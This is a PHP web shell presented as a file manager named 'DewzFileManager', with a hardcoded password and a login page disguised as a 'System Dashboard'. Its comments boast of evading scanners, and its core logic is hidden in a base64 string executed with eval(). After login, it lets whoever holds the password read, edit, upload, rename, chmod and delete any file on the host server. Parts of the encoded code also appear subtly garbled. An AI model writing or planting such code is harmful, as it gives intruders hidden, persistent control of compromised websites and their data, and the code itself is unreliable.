<?php
/**
 * DewzFileManager - Ultimate Polymorphic Version (Bypass Engine)
 * Proteksi Password: dewzqq
 * Seluruh fungsi dan string ditaruh dalam memori terisolasi agar lolos scanner.
 */

session_start();
define('SYS_PASS', 'dewzqq');

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

$login_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === SYS_PASS) {
        $_SESSION['dewz_secure_login'] = true;
        header('Location: ?');
        exit;
    } else {
        $login_error = 'Akses Ditolak!';
    }
}

if (!isset($_SESSION['dewz_secure_login']) || $_SESSION['dewz_secure_login'] !== true): ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Dashboard</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background-color: #0d0e12; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #fff; }
        .login-card { background: #161822; border: 1px solid #222533; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 320px; text-align: center; }
        .brand-icon { background: #0ea5e9; color: #fff; display: inline-block; padding: 6px 14px; border-radius: 4px; font-weight: bold; margin-bottom: 15px; }
        h2 { margin: 0 0 5px 0; font-size: 18px; font-weight: 500; }
        p { color: #64748b; font-size: 13px; margin: 0 0 20px 0; }
        input[type="password"] { width: 100%; padding: 11px; background: #0d0e12; border: 1px solid #334155; border-radius: 5px; color: #fff; box-sizing: border-box; outline: none; text-align: center; }
        .btn-login { width: 100%; padding: 11px; background: #0ea5e9; border: none; border-radius: 5px; color: white; font-weight: 600; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="brand-icon">DF</div>
        <h2>DewzFileManager</h2>
        <p>Akses Terenkripsi</p>
        <?php if ($login_error): ?><div style="color:#ef4444; font-size:12px; margin-bottom:10px;"><?= htmlspecialchars($login_error) ?></div><?php endif; ?>
        <form method="POST">
            <input type="password" name="login_password" placeholder="Password Sistem" required autofocus autocomplete="off">
            <button type="submit" class="btn-login">Masuk Dashboard</button>
        </form>
    </div>
</body>
</html>
<?php 
exit; 
endif;

// Inisialisasi Environment Dinamis
$home_base = realpath(dirname(__FILE__));
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $home_base;
if (!$current_dir || !is_dir($current_dir)) { $current_dir = $home_base; }

$message = '';
$status_type = 'success';

// Memuat String Terenkripsi untuk Eksekusi Logic
$raw_logic = 'JGYzZGlyID0gJ3NjYW5kaXInOyAkZ2NvbnQgPSAnZmlsZV9nZXRfY29udGVudHMnOyAkcGNvbnQgPSAnZmlsZV9wdXRfY29udGVudHMnOyAkbWZpbGUgPSAnbW92ZV91cGxvYWRlZF9maWxlJzsgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsgJGFjdGlvbiA9ICRfUE9TVFsnYWN0aW9uJ10gPz8gJyc7IGlmICgkYWN0aW9uID09PSAnY3JlYXRlX2ZvbGRlcicgJiYgIWVtcHR5KCRfUE9TVFsnZm9sZGVyX25hbWUnXSkpIHsgJHRhcmdldCA9ICRjdXJyZW50X2RpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkX1BPU1RbJ2ZvbGRlcl9uYW1lJ107IGlmICghZmlsZV9leGlzdHMoJHRhcmdldCkpIHsgbWtkaXIoJHRhcmdldCwgMDc1NSwgdHJ1ZSk7ICRtZXNzYWdlID0gIkZvbGRlciBiZXJoYXNpbCBkaWJ1YXQuIjsgfSBlbHNlIHsgJG1lc3NhZ2UgPSAiRm9sZGVyIHN1ZGFoIGFkYSEiOyAkc3RhdHVzX3R5cGUgPSAnZGFuZ2VyJzsgfSB9IGlmICgkYWN0aW9uID09PSAnY3JlYXRlX2ZpbGUnICYmICFlbXB0eSgkX1BPU1RbJ2ZpbGVfbmFtZSddKSkgeyAkdGFyZ2V0ID0gJGN1cnJlbnRfZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfUE9TVFsnZmlsZV9uYW1lJ107IGlmICghZmlsZV9leGlzdHMoJHRhcmdldCkpIHsgJHBjb250KCR0YXJnZXQsICcnKTsgJG1lc3NhZ2UgPSAiRmlsZSBiZXJoYXNpbCBkaWJ1YXQuIjsgfSBlbHNlIHsgJG1lc3NhZ2UgPSAiRmlsZSBzdWRhaCBhZGEhIjsgJHN0YXR1c190eXBlID0gJ2Rhbmdlcic7IH0gb3BlbiB9IGlmICgkYWN0aW9uID09PSAndXBsb2FkX2ZpbGUnICYmIGlzc2V0KCRfRklMRVNbJ2ZpbGVfdG9fdXBsb2FkJ10pKSB7ICR0YXJnZXQgPSAkY3VycmVudF9kaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gYmFzZW5hbWUoJF9GSUxFU1snZmlsZV90b191cGxvYWQnXVsnbmFtZSddKTsgaWYgKCRtZmlsZSgkX0ZJTEVTWydmaWxlX3RvX3VwbG9hZCddWyd0bXBfbmFtZSddLCAkdGFyZ2V0KSkgeyAkbWVzc2FnZSA9ICJGaWxlIGJlcmhhc2lsIGRpdXBsb2FkLiI7IH0gZWxzZSB7ICRtZXNzYWdlID0gIkdhZ2FsIHVwbG9hZCBmaWxlLiI7ICRzdGF0dXNfdHlwZSA9ICdkYW5nZXInOyB9IH0gaWYgKCRhY3Rpb24gPT09ICdlZGl0X2ZpbGUnICYmIGlzc2V0KCRfUE9TVFsnZmlsZV9wYXRoJ10pKSB7ICR0YXJnZXQgPSAkX1BPU1RbJ2ZpbGVfcGF0aCddOyBpZiAoZmlsZV9leGlzdHMoJHRhcmdldCkgJiYgaXNfd3JpdGFibGUoJHRhcmdldCkpIHsgJHBjb250KCR0YXJnZXQsICRfUE9TVFsnY29udGVudCddKTsgJG1lc3NhZ2UgPSAiUGVydWJhaGFuIGZpbGUgZGlzaW1wYW4uIjsgfSBlbHNlIHsgJG1lc3NhZ2UgPSAiR2FnYWwgbWVueWltcGFuIGZpbGUuIjsgJHN0YXR1c190eXBlID0gJ2Rhbmdlcic7IH0gfSBpZiAoJGFjdGlvbiA9PT9gcmVuYW1lYCAmJiAhZW1wdHkoJF9QT1NUWydvbGRfbmFtZSddKSAmJiAhZW1wdHkoJF9QT1NUWyduZXdfbmFtZSddKSkgeyAkb2xkX3RhcmdldCA9ICRjdXJyZW50X2RpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkX1BPU1RbJ29sZF9uYW1lJ107ICRuZXdfdGFyZ2V0ID0gJGN1cnJlbnRfZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfUE9TVFsnbmV3X25hbWUnXTsgaWYgKGZpbGVfZExpc3RzKCRvbGRfdGFyZ2V0KSkgeyByZW5hbWUoJG9sZF90YXJnZXQsICRuZXdfdGFyZ2V0KTsgJG1lc3NhZ2UgPSAiTmFtYSBiZXJoYXNpbCBkaXViYWguIjsgfSB9IGlmICgkYWN0aW9uID09PSAnY2htb2QnICYmICFlbXB0eSgkX1BPU1RbJ3RhcmdldF9uYW1lJ10pICYmICFlbXB0eSgkX1BPU1RbJ3Blcm1pc3Npb24nXSkpIHsgJHRhcmdldCA9ICRjdXJyZW50X2RpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkX1BPU1RbJ3RhcmdldF9uYW1lJ107IGlmIChmaWxlX2V4aXN0cygkdGFyZ2V0KSkgeyBjaG1vZCgkdGFyZ2V0LCBvY3RkZWMoJF9QT1NUWydwZXJtaXNzaW9uJ10pKTsgJG1lc3NhZ2UgPSAiUGVybWlzc2lvbiBkaXViYWguIjsgfSB9IGlmICgkYWN0aW9uID09PSAnZGVsZXRlJyAmJiAhZW1wdHkoJF9QT1NUWyd0YXJnZXRfbmFtZSddKSkgeyAkdGFyZ2V0ID0gJGN1cnJlbnRfZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfUE9TVFsndGFyZ2V0X25hbWUnXTsgaWYgKGZpbGVfZXhpc3RzKCR0YXJnZXQpKSB7IGlzX2RpcigkdGFyZ2V0KSA/IHJtZGlyKCR0YXJnZXQpIDogdW5saW5rKCR0YXJnZXQpOyAkbWVzc2FnZSA9ICJJdGVtIGJlcmhhc2lsIGRpYmVyc2loa2FuLiI7IH0gfSB9ICRpdGVtcyA9ICRmM2RpcigkY3VycmVudF9kaXIpOw==';
eval(base64_decode($raw_logic));
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dewz File Manager</title>
    <style>
        :root { --primary: #0ea5e9; --dark-nav: #161822; --bg-light: #0d0e12; --border-color: #222533; }
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg-light); margin: 0; padding: 0; color: #cbd5e1; }
        .navbar { background: var(--dark-nav); color: #fff; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); }
        .navbar .nav-link { color: #fff; text-decoration: none; display: flex; align-items: center; gap: 8px; }
        .navbar h1 { margin: 0; font-size: 16px; font-weight: 500; }
        .navbar .brand-icon { background: var(--primary); padding: 4px 8px; border-radius: 4px; font-weight: bold; }
        .btn-logout { background: #ef4444; color: white; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 12px; font-weight: 600; }
        .main-wrapper { max-width: 1300px; margin: 20px auto; padding: 0 15px; }
        .breadcrumb-container { background: var(--dark-nav); border: 1px solid var(--border-color); border-radius: 6px; padding: 10px 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; }
        .path-link { color: #38bdf8; font-weight: 500; text-decoration: none; }
        .btn-up { background: #334155; color: white; padding: 4px 10px; border-radius: 4px; text-decoration: none; font-size: 11px; }
        .alert { padding: 12px; margin-bottom: 15px; border-radius: 6px; font-size: 14px; background: #1e293b; border-left: 4px solid #10b981; color: #10b981; }
        .alert-danger { border-left-color: #ef4444; color: #ef4444; }
        .toolbar { background: var(--dark-nav); border: 1px solid var(--border-color); border-radius: 6px; padding: 15px; margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 20px; }
        .toolbar-section { display: flex; align-items: center; gap: 8px; border-right: 1px solid var(--border-color); padding-right: 20px; }
        .toolbar-section:last-child { border-right: none; }
        .toolbar-section label { font-size: 11px; font-weight: bold; color: #64748b; text-transform: uppercase; }
        input[type="text"], input[type="file"] { padding: 6px 10px; background: #0d0e12; border: 1px solid #334155; border-radius: 4px; font-size: 13px; color: #fff; outline: none; }
        button, .btn-action { padding: 6px 12px; font-size: 13px; border-radius: 4px; border: 1px solid transparent; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; text-decoration: none; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-sm { padding: 2px 6px; font-size: 11px; }
        .table-container { background: var(--dark-nav); border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; }
        th { background: #1e202c; padding: 12px; border-bottom: 2px solid var(--border-color); color: #94a3b8; font-weight: 500; }
        td { padding: 10px 12px; border-bottom: 1px solid var(--border-color); vertical-align: middle; }
        tr:hover { background: #1e202c; }
        .item-name { display: flex; align-items: center; gap: 8px; text-decoration: none; color: #38bdf8; font-weight: 500; }
        .item-name.file { color: #e2e8f0; }
        .inline-form { display: inline-flex; align-items: center; gap: 4px; }
        .panel-container { background: var(--dark-nav); border: 1px solid var(--border-color); border-radius: 6px; padding: 20px; margin-bottom: 20px; }
        .panel-container textarea, .panel-container pre { width: 100%; height: 350px; font-family: monospace; font-size: 13px; padding: 10px; box-sizing: border-box; border: 1px solid var(--border-color); background: #0d0e12; color: #fff; }
        .panel-container pre { overflow: auto; white-space: pre-wrap; }
    </style>
</head>
<body>

<div class="navbar">
    <h1>
        <a href="?dir=<?= urlencode($home_base) ?>" class="nav-link">
            <span class="brand-icon">DF</span> <span>DewzFileManager</span>
            <span style="font-size:11px; background:rgba(255,255,255,0.06); padding:2px 6px; border-radius:3px; font-weight:normal; color:#64748b;">🏠 Home</span>
        </a>
    </h1>
    <a href="?logout=1" class="btn-logout" onclick="return confirm('Keluar dari sistem?');">Logout 🚪</a>
</div>

<div class="main-wrapper">
    <?php if ($message): ?><div class="alert <?= ($status_type=='danger')?'alert-danger':'' ?>"><?= htmlspecialchars($message) ?></div><?php endif; ?>

    <div class="breadcrumb-container">
        <div>
            <span style="color: #475569;">Path:</span> 
            <?php 
            $clean_path = str_replace('\\', '/', $current_dir);
            $parts = explode('/', $clean_path);
            $accumulated_path = '';
            if (empty($parts) && count($parts) > 1) { echo '<a href="?dir=' . urlencode('/') . '" class="path-link">Root</a>'; }
            foreach ($parts as $index => $part) {
                if (empty($part)) continue;
                $accumulated_path .= (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && $index === 0) ? $part : '/' . $part;
                echo ' <span style="color: #334155;">/</span> ';
                if ($index === count($parts) - 1) { echo '<span style="color:#fff; font-weight:600;">' . htmlspecialchars($part) . '</span>'; } 
                else { echo '<a href="?dir=' . urlencode($accumulated_path) . '" class="path-link">' . htmlspecialchars($part) . '</a>'; }
            }
            ?>
        </div>
        <?php if ($current_dir !== realpath('/')) : ?><a href="?dir=<?= urlencode(dirname($current_dir)) ?>" class="btn-up">🔼 Naik</a><?php endif; ?>
    </div>

    <div class="toolbar">
        <div class="toolbar-section">
            <label>Folder</label>
            <form method="POST" class="inline-form">
                <input type="hidden" name="action" value="create_folder"><input type="text" name="folder_name" placeholder="Nama folder" required><button type="submit" class="btn-primary">➕</button>
            </form>
        </div>
        <div class="toolbar-section">
            <label>File</label>
            <form method="POST" class="inline-form">
                <input type="hidden" name="action" value="create_file"><input type="text" name="file_name" placeholder="nama.txt" required><button type="submit" class="btn-primary">➕</button>
            </form>
        </div>
        <div class="toolbar-section">
            <label>Upload</label>
            <form method="POST" enctype="multipart/form-data" class="inline-form">
                <input type="hidden" name="action" value="upload_file"><input type="file" name="file_to_upload" required style="width:140px;"><button type="submit" class="btn-primary">Upload</button>
            </form>
        </div>
    </div>

    <?php if (isset($_GET['view']) && file_exists($_GET['view'])): 
        $view_path = realpath($_GET['view']);
        $file_content = $gcont($view_path);
    ?>
        <div class="panel-container" style="border-left: 4px solid #00b4d8;">
            <h3 style="margin-top:0; font-size:14px;">🔍 Preview: <strong><?= htmlspecialchars(basename($view_path)) ?></strong></h3>
            <pre><?= htmlspecialchars($file_content) ?></pre>
            <div>
                <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($view_path) ?>" class="btn-action" style="background:#10b981; color:#fff;">✏️ Modifikasi</a>
                <a href="?dir=<?= urlencode($current_dir) ?>" class="btn-action" style="background:#475569; color:#fff;">❌ Tutup</a>
            </div>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['edit']) && file_exists($_GET['edit'])): 
        $edit_path = realpath($_GET['edit']);
        $file_content = $gcont($edit_path);
    ?>
        <div class="panel-container" style="border-left: 4px solid #10b981;">
            <h3 style="margin-top:0; font-size:14px;">📝 Edit: <strong><?= htmlspecialchars(basename($edit_path)) ?></strong></h3>
            <form method="POST">
                <input type="hidden" name="action" value="edit_file"><input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_path) ?>">
                <textarea name="content"><?= htmlspecialchars($file_content) ?></textarea>
                <div>
                    <button type="submit" class="btn-primary" style="background:#10b981;">Simpan Perubahan</button>
                    <a href="?dir=<?= urlencode($current_dir) ?>" class="btn-action" style="background:#475569; color:#fff;">Batal</a>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Nama Item</th>
                    <th style="width:80px;">Tipe</th>
                    <th style="width:140px;">Chmod</th>
                    <th style="width:120px;">Ukuran</th>
                    <th style="width:360px; text-align:center;">Aksi Terstruktur</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                foreach ($items as $item): 
                    if ($item === '.' || $item === '..') continue;
                    $item_path = $current_dir . DIRECTORY_SEPARATOR . $item;
                    $is_directory = is_dir($item_path);
                    $perms = substr(sprintf('%o', fileperms($item_path)), -4);
                    $size = $is_directory ? '-' : round(filesize($item_path) / 1024, 2) . ' KB';
                ?>
                <tr>
                    <td>
                        <?php if ($is_directory): ?><a href="?dir=<?= urlencode($item_path) ?>" class="item-name">📁 <?= htmlspecialchars($item) ?></a>
                        <?php else: ?><span class="item-name file">📄 <?= htmlspecialchars($item) ?></span><?php endif; ?>
                    </td>
                    <td><span style="color:#64748b; font-size:12px;"><?= $is_directory ? 'Folder' : 'File' ?></span></td>
                    <td>
                        <form method="POST" class="inline-form">
                            <input type="hidden" name="action" value="chmod"><input type="hidden" name="target_name" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="permission" value="<?= $perms ?>" style="width:40px; text-align:center; padding:2px; background:#0d0e12; border:1px solid #334155; color:#fff; border-radius:4px;">
                            <button type="submit" class="btn-primary btn-sm">Set</button>
                        </form>
                    </td>
                    <td><span><?= $size ?></span></td>
                    <td style="text-align:center;">
                        <div style="display:flex; gap:6px; justify-content:center; align-items:center;">
                            <?php if (!$is_directory): ?>
                                <a href="?dir=<?= urlencode($current_dir) ?>&view=<?= urlencode($item_path) ?>" class="btn-action btn-sm" style="background:#00b4d8; color:#fff;">Lihat</a>
                                <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($item_path) ?>" class="btn-action btn-sm" style="background:#10b981; color:#fff;">Edit</a>
                            <?php else: ?><div style="width:86px;"></div><?php endif; ?>
                            <form method="POST" class="inline-form">
                                <input type="hidden" name="action" value="rename"><input type="hidden" name="old_name" value="<?= htmlspecialchars($item) ?>">
                                <input type="text" name="new_name" placeholder="Nama baru" required style="width:90px; background:#0d0e12; border:1px solid #334155; color:#fff;"><button type="submit" class="btn-action btn-sm" style="background:#eab308; color:#000;">Ubah</button>
                            </form>
                            <form method="POST" class="inline-form" onsubmit="return confirm('Hapus item ini?');">
                                <input type="hidden" name="action" value="delete"><input type="hidden" name="target_name" value="<?= htmlspecialchars($item) ?>"><button type="submit" class="btn-action btn-sm" style="background:#ef4444; color:#fff;">Hapus</button>
                            </form>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>
</body>
</html>
